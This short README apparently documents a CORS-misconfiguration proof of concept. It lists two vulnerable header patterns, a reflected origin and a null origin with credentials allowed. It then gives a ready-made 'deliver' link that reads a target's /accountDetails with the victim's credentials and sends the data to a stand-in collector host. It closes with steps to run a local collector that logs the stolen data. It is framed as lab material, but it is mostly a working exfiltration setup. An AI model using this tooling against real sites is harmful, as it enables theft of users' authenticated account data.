# CORS PoC (local lab)
case 1 reflections
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true

case 2 null origin
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

Now you can send a single “deliver” link such as:
https://ythone.github.io/cors_poc/deliver.html?target=https://TARGET/accountDetails&creds=1&exfil=https://your-collector.example/collect

https://ythone.github.io/cors_poc/deliver.html
  ?target=https://TARGET/accountDetails
  &creds=1
  &exfil=https://your-collector.example/collect


Run locally:

npm i
node server.js
# -> POST target data to http://localhost:8089/collect ; view http://localhost:8089/logs


Point your PoC’s exfil to that /collect endpoint.
